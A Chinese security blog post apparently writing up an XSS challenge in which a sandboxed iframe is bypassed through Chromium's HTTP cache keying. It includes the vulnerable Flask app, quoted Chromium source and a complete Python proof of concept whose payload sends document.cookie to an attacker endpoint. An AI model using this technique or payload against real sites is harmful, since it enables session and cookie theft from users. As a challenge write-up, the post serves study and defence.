---
title: 有趣的绕过，Cache XSS
url: https://mp.weixin.qq.com/s/hTTK0i_klUw2lPCCUmhR7A
source: Doonsec's feed
date: 2026-10-05
fetch_date: 2026-10-06T08:20:11.631506
---

# 有趣的绕过，Cache XSS

# 有趣的绕过，Cache XSS

原创

YMsora
YMsora

YMs0ra的安全漫路

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 有趣的绕过，Cache XSS

总会有一些好玩的事情值得我去研究

(也是忙着新东西没时间写很多文章了)

老生常谈的xss，不过这次非常不一样

用了一些比较脑洞大开的trick，想来也是非常有趣的，以下是源码

```
from flask import Flask, request, make_response

app = Flask(__name__)
SECRET = "flag{this_is_a_dummy_flag}"

@app.get("/")
def index():
    return """
<body>
  <h1>XSS Challenge</h1>
  <form action="/">
    <textarea name="html" rows="4" cols="36"></textarea>
    <button type="submit">Render</button>
  <form>
  <script type="module">
    const blob = await fetch("/render" + location.search, {
      headers: { "X-From-Script": "1" },
    }).then((r) => r.blob());
    if (blob.size) {
      document.forms[0].html.value = await blob.text();
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "");
      iframe.src = URL.createObjectURL(blob);
      document.body.append(iframe);
    }
  </script>
</body>
    """.strip()

@app.get("/render")
def render():
    if not request.headers.get("X-From-Script", ""):
        return "Use script", 400
    res = make_response(request.args.get("html", ""))
    return res

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)
```

可以看到访问首页后提交的html被丢入iframe并且设置了sandbox，rander路由返回了原始的html，

但是因为sandbox我无法执行js，并且直接访问render想直接渲染，但是我无法控制bot的X-From-Script头，那就直接返回400了

看上去完全没有办法，那就开始研究吧

先引入一下新Chromium 的cache的机制

因为注意到

```
  if (blob.size) {
      document.forms[0].html.value = await blob.text();
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "");
      iframe.src = URL.createObjectURL(blob);
      document.body.append(iframe);
    }
```

是发生在服务端返回的后面的，这样的话cache也就和后续的js没有关系

而且cache是发生在顶层文档的，html会进行解析，我可以控制的只有bot访问，接下来怎么办呢

cache的调用因素如下

| # | 因素 | 来源 | 说明 |
| --- | --- | --- | --- |
| 1 | **URL** | 请求 | 字符级完全一致，**连百分号编码都要一样** |
| 2 | **top-frame site** | NetworkIsolationKey | 地址栏那个页面的站点（eTLD+1） |
| 3 | **frame site** | NetworkIsolationKey | 真正发请求的那个 frame 的站点 |
| 4 | **`s_`** | `is_subframe_document_resource` | 这次是"子框架的文档资源"吗 |
| 5 | **`cn_`** ★ | `is_mainframe_navigation && initiator.has_value() && !IsSameSite(initiator, url)` | 这次是"跨站发起的主框架导航"吗 |
| 6 | credential 前缀 | `LOAD_DO_NOT_SAVE_COOKIES` | "1/"（带 credentials）/"0/"（不带） |
| 7 | upload id | 请求体 | POST body 的标识；GET 恒为 0 |
| 8 | `_dk_` | 分区缓存总开关 | 有没有开 network state partitioning |

需要注意的是frame site以及cn，需要的是no-cross-site，但是我只能控制我的页面的js

可以注意到直接访问 / 以及同源fetch是没有改变initiator，page goto也是原本浏览器发起，initiator也为null，

以及实测redirect也是没有改变initiator的

但是location以及跨站的fetch是cross-site,

由此可得思路，让bot导航到攻击者页面后，执行js，page goto到xss地址并且同源fetch render，这时返回的是html以及200响应

但是因为sandbox是没有渲染的，无法执行，所以让bot二次访问，并且设定blob协议，history.back( )

再将攻击者的 / 重定向到目标的/view，如此就可以命中缓存，直接return payload到bot的顶层文档

如此xss也就渲染了，并没有服务端的下一步

要注意的是，在302重定向时需要no-store，不然默认是不会发起请求的，请求后也就会把payload恢复

poc如下

```
#!/usr/bin/env python3
# framed-xss PoC — python3 poc.py
from flask import Flask, redirect, request
from urllib.parse import quote
import json

def encodeURIComponent(s):
    return quote(s, safe="~()*!'")

app = Flask(__name__)

REMOTE   = "http://victim.localhost:3000"
ENDPOINT = "/render"
SELF     = "http://attacker.localhost:7777"
PAYLOAD  = "<script>fetch('%s/x?c='+encodeURIComponent(document.cookie))</script>" % SELF
PORT     = 7777

@app.after_request
def add_headers(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache"
    return resp
i = 0
@app.get("/")
def index():
    global i
    i = (i + 1) % 2
    if i == 1:
        return r"""
<script>
const sleep = ms => new Promise(res => setTimeout(res, ms))
const remote = %s
const payload = %s
;(async()=>{
    open(new URL('/?html=' + encodeURIComponent(payload), remote))
    await sleep(1000)
    location = URL.createObjectURL(new Blob([`
        <script>setTimeout(()=>history.back(), 1000)<\/script>
    `], { type: "text/html" }))
})()
</script>
""" % (json.dumps(REMOTE), json.dumps(PAYLOAD).replace("</", "<\\/"))
    return redirect("%s%s?html=%s" % (REMOTE, ENDPOINT, encodeURIComponent(PAYLOAD)))

@app.get("/x")
def exfil():
    print("\n[+PWN] cookie = %r\n" % request.args.get("c"), flush=True)
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
```

所以想来cache都是满足的

附上Chromium关于cache相关的处理源码

```
// static
std::optional<std::string> HttpCache::GenerateCacheKey(
    const GURL& url,
    int load_flags,
    const NetworkIsolationKey& network_isolation_key,
    std::optional<int64_t> upload_data_identifier,
    bool is_subframe_document_resource,
    bool is_mainframe_navigation,          // ← 是不是主框架导航
    bool is_shared_resource,
    std::optional<url::Origin> initiator,  // ← 发起者，可为 nullopt
    bool include_url) {
  std::string isolation_key;
  if (IsSplitCacheEnabled()) {
    if (network_isolation_key.IsTransient()) {
      return std::nullopt;
    }
    if (!is_shared_resource) {
      const std::string_view subframe_prefix =
          is_subframe_document_resource ? kSubframeDocumentResourcePrefix : "";

      // ★★★★★ 新加的那个维度就是这里 ★★★★★
      const bool is_cross_site_main_frame_navigation =
          is_mainframe_navigation && initiator.has_value() &&
          !net::SchemefulSite::IsSameSite(*initiator, url::Origin::Create(url));
      const std::string_view cross_site_prefix =
          is_cross_site_main_frame_navigation
              ? kCrossSiteMainFrameNavigationPrefix
              : "";

      isolation_key = base::StrCat({
          kDoubleKeyPrefix,          // "_dk_"
          subframe_prefix,           // "s_" 或 ""
          cross_site_prefix,         // ★ "cn_" 或 ""
          *network_isolation_key.ToCacheKeyString(),
          include_url ? kDoubleKeySeparator : "",
      });
    }
  }
  ...
  // key 形状: credential_key/upload_id/[isolation_key]url
  return base::StrCat({credential_prefix, ...,
                       isolation_key, include_url ? HttpUtil::SpecForRequest(url) : ""});
}
```

以上

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/SPfHPOgCrHqnEGA5UdIaMIgRXzPnnCSh042ULM5KKfT02L44y1rmHfdXTK9kwOjfmrdQtueTpakrQ79Vwp4xdABk3GewsqGV8sdJLb8GKps/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过